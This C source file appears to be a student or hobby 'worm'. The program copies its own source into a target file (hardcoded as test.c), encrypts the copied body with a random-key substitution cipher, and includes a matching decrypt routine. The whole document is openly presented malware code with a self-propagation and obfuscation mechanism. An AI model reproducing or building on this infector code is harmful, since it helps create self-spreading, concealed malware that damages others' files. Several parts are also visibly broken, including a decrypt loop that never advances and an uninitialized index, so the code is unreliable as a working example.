//Part b
//INIT_WORM
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdbool.h>
#include <unistd.h>
#include <libssh/libssh.h>

char alphabet[]={'0','1','2','3','4','5','6','7','8','9','a','b','c','c','d','e','f','g','h','i','j',
		'k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F',
		'G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','_',
		'!','!','@','#','$','%','^','&','*','(',')','-','+','=','{','}','[',']','|',':',';','<',
		'>',',','.','?','/'};

char encrypt_code[500];
void encrypt(char code[],int key){
	//char encrypt_code[500];
	int i,j,index_of_char=999,ptr=0;
	for(i=0;i<strlen(code);i++){
		for(j=0;j<strlen(alphabet);j++){
			if(code[i]==alphabet[j]){
				index_of_char=j;
				break;
			}
		}
		encrypt_code[ptr++]=alphabet[(index_of_char+key)%strlen(alphabet)];
	}
	
}
void copyCode(char dest[]){
    FILE *fp, *fp1;
    char buf[50000];
    char init_worm[]="//INIT_WORM";
    char line[500];
    char char_key[1000];
    int i,flag,key;
    fp=fopen(__FILE__,"r");
    fp1=fopen(dest,"a+");
    fprintf(fp1, "\n################## Worm written in C by Omkar Gavhane################\n");
    while(fscanf(fp, "%[^\n] ",line) != EOF) {
	flag=1;
	for(i=0;i<strlen(init_worm);i++){
		if(line[i]!=init_worm[i]){
			flag=0;
			break;
		}
	}
            if(flag){
		key=rand();
		sprintf(char_key,"%ld",key);
	    	fprintf(fp1,"%s-%s\n",line,char_key);
		//printf("%s\n",line);
		break;
	    }
    }
    while(fscanf(fp, "%[^\n] ",line) != EOF) {
            if(strcmp(line,"//MIDD_WORM")==0){
	    	fprintf(fp1,"%s\n",line);
		//printf("%s\n",line);
		break;
	    }
	encrypt(line,key);
	for(i=0;i<strlen(line);i++){
		line[i]=encrypt_code[i];
	}
	fprintf(fp1,"%s\n",line);
	//printf("%s\n",line);

   }
	while(fscanf(fp, "%[^\n] ",line) != EOF) {
            if(strcmp(line,"//ENDD_WORM")==0){
	    	fprintf(fp1,"%s\n",line);
		//printf("%s\n",line);
		break;
	    }
	fprintf(fp1,"%s\n",line);
	//printf("%s\n",line);

   }

   fclose(fp1);
   fclose(fp);
}
void selectTarget(){
 FILE *fp;
    char c;
    char dest[] = "test.c";
    fp = fopen(dest,"a");
    if (fp == NULL){
        printf("Sorry File not found\n");
    exit(EXIT_FAILURE);
  }
copyCode(dest);

}
void infect(){
 selectTarget();
 printf("Worm written in c,just for fun\n");
}

int main(int argc, char*argv[]) {
  infect();
  return 0;
}
//MIDD_WORM
char alphabet1[]={'0','1','2','3','4','5','6','7','8','9','a','b','c','c','d','e','f','g','h','i','j',
		'k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F',
		'G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','_',
		'!','!','@','#','$','%','^','&','*','(',')','-','+','=','{','}','[',']','|',':',';','<',
		'>',',','.','?','/'};

char decrypt_code[500];
void decrypt_algo(char code[],int key){
	int i,j,index_of_char=999,ptr=0;
	for(i=0;i<strlen(code);i++){
		for(j=0;j<strlen(alphabet);j++){
			if(code[i]==alphabet1[j]){
				index_of_char=j;
				break;
			}
		}
		decrypt_code[ptr++]=alphabet1[(index_of_char-key)%strlen(alphabet1)];
	}
}
void decrypt(){
	FILE *fp, *fp1;
	 char init_worm[]="//INIT_WORM";
    	char line[500];
    	char char_key[1000];
    	int i,flag,key,j;
    	fp=fopen(__FILE__,"r");
	while(fscanf(fp, "%[^\n] ",line) != EOF) {
	flag=1;
	for(i=0;i<strlen(init_worm);i++){
		if(line[i]!=init_worm[i]){
			flag=0;
			break;
		}
		}
            if(flag){
		while(line[i]!='\n')
			char_key[j++]=line[i];
		key=atoi(char_key);
		//sprintf(char_key,"%ld",key);
	    	//fprintf(fp1,"%s-%s\n",line,char_key);
		//printf("%s\n",line);
		break;
	    }
    	}
	 while(fscanf(fp, "%[^\n] ",line) != EOF) {
            if(strcmp(line,"//MIDD_WORM")==0){
	    	//fprintf(fp1,"%s\n",line);
		//printf("%s\n",line);
		break;
	    }
	decrypt_algo(line,key);
	for(i=0;i<strlen(line);i++){
		line[i]=encrypt_code[i];
	}
	//fprintf(fp1,"%s\n",line);
	//printf("%s\n",line);

   }


}
//ENDD_WORM
